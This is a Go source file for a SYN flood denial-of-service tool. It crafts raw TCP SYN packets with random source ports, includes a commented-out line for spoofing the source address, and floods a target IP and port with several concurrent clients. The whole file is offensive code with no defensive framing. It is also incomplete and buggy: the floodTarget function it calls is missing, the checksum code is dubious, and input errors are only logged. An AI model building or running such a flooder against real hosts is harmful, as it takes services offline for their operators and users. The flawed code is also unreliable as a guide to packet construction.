package main

import (
	"crypto/rand"
	"flag"
	"log"
	"net"
	"os"
	"os/signal"
	"os/user"
	"reflect"
	"strconv"
	"strings"
	"sync"
	"syscall"
)

var (
	ip      string
	port    uint
	clients int
	logPath string
	localIP net.IP
)

func isRoot() {
	user, err := user.Current()
	if err != nil || user.Name != "root" {
		log.Println("Root privileges required for execution")
	}
}

func setupFlags() {
	flag.StringVar(&ip, "ip", "127.0.0.1", "Target IP address")
	flag.UintVar(&port, "p", 6001, "Target Port")
	flag.IntVar(&clients, "c", 1, "number of concurrent clients (default 1)")
	flag.StringVar(&logPath, "lp", "./synFlooding.log", "The path to the log file (default ./client.log)")
}

func setupLogging() {
	logFile, err := os.OpenFile(logPath, os.O_APPEND|os.O_RDWR|os.O_CREATE, 0644)
	if err != nil {
		log.Println(err)
		return
	}

	log.SetFlags(log.Ldate | log.Lmicroseconds | log.LUTC)
	log.SetOutput(logFile)

}

func setupSignals() {
	sigs := make(chan os.Signal, 1)
	signal.Notify(sigs, os.Interrupt, syscall.SIGTERM)

	go func() {
		s := <-sigs
		log.Printf("RECEIVED SIGNAL: %s", s)
		os.Exit(1)
	}()

}

type SYNPacket struct {
	Payload   []byte
	TCPLength uint16
	Adapter   string
}

func (s SYNPacket) randByte() byte {
	randomUINT8 := make([]byte, 1)
	rand.Read(randomUINT8)
	return randomUINT8[0]
}

func (s SYNPacket) invalidFirstOctet(val byte) bool {
	return val == 0x7F || val == 0xC0 || val == 0xA9 || val == 0xAC
}

func (s SYNPacket) leftshiftor(lval uint8, rval uint8) uint32 {
	return (uint32)(((uint32)(lval) << 8) | (uint32)(rval))
}

type TCPIP struct {
	VersionIHL    byte
	TOS           byte
	TotalLen      uint16
	ID            uint16
	FlagsFrag     uint16
	TTL           byte
	Protocol      byte
	IPChecksum    uint16
	SRC           []byte
	DST           []byte
	SrcPort       uint16
	DstPort       uint16
	Sequence      []byte
	AckNo         []byte
	Offset        uint16
	Window        uint16
	TCPChecksum   uint16
	UrgentPointer uint16
	Options       []byte
	SYNPacket     `key:"SYNPacket"`
}

func (tcp *TCPIP) calcTCPChecksum() {
	var checksum uint32 = 0
	checksum = tcp.leftshiftor(tcp.SRC[0], tcp.SRC[1]) +
		tcp.leftshiftor(tcp.SRC[2], tcp.SRC[3])
	checksum += tcp.leftshiftor(tcp.DST[0], tcp.DST[1]) +
		tcp.leftshiftor(tcp.DST[2], tcp.DST[3])
	checksum += uint32(tcp.SrcPort)
	checksum += uint32(tcp.DstPort)
	checksum += uint32(tcp.Protocol)
	checksum += uint32(tcp.TCPLength)
	checksum += uint32(tcp.Offset)
	checksum += uint32(tcp.Window)

	carryOver := checksum >> 16
	tcp.TCPChecksum = 0xFFFF - (uint16)((checksum<<4)>>4+carryOver)

}

func (tcp *TCPIP) setPacket() {
	tcp.TCPLength = 0x0028
	tcp.VersionIHL = 0x45
	tcp.TOS = 0x00
	tcp.TotalLen = 0x003C
	tcp.ID = 0x0000
	tcp.FlagsFrag = 0x0000
	tcp.TTL = 0x40
	tcp.Protocol = 0x06
	tcp.IPChecksum = 0x0000
	tcp.Sequence = make([]byte, 4)
	tcp.AckNo = tcp.Sequence
	tcp.Offset = 0xA002
	tcp.Window = 0xFAF0
	tcp.UrgentPointer = 0x0000
	tcp.Options = make([]byte, 20)
	tcp.calcTCPChecksum()
}

func (tcp *TCPIP) setTarget(ipAddr string, port uint16) {
	for _, octet := range strings.Split(ipAddr, ".") {
		val, _ := strconv.Atoi(octet)
		tcp.DST = append(tcp.DST, (uint8)(val))
	}
	tcp.DstPort = port
}

func setLocalIP() {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		log.Println(err)
	}

	for _, address := range addrs {
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				localIP = net.ParseIP(ipnet.IP.String())
			}
		}
	}
}

func (tcp *TCPIP) genIP() {

	tcp.SRC = localIP.To4()
	//tcp.SRC[3] = tcp.randByte()

	tcp.SrcPort = (uint16)(((uint16)(tcp.randByte()) << 8) | (uint16)(tcp.randByte()))
	for tcp.SrcPort <= 0x03FF {
		tcp.SrcPort = (uint16)(((uint16)(tcp.randByte()) << 8) | (uint16)(tcp.randByte()))
	}
}

func checkInputArgs() {
	if len(ip) < 1 || net.ParseIP(ip) == nil {
		log.Println("required argument: -t <target IP addr>")
	}
	if strings.Count(ip, ".") != 3 || strings.Contains(ip, ":") {
		log.Println("invalid IPV4 address: ", ip)
	}
	if port > 0xFFFF {
		log.Println("invalid port: ", port)
	}
}

func init() {
	/* Check root accesses
	*
	 */
	isRoot()

	/* Setup the input flags
	*
	 */
	setupFlags()

	/* Setup logging
	*
	 */
	setupLogging()

	/* Setup signal catching
	*
	 */
	setupSignals()

	/* Set local IP variable
	*
	 */
	setLocalIP()
}

func main() {

	flag.Parse()
	checkInputArgs()

	var wg sync.WaitGroup
	var packet = &TCPIP{}

	defer func() {
		if err := recover(); err != nil {
			log.Println("error: %v", err)
		}
	}()

	packet.setTarget(ip, uint16(port))
	packet.genIP()
	packet.setPacket()

	packet.floodTarget(
		reflect.TypeOf(packet).Elem(),
		reflect.ValueOf(packet).Elem(),
		clients,
		&wg,
	)

	wg.Wait()
}
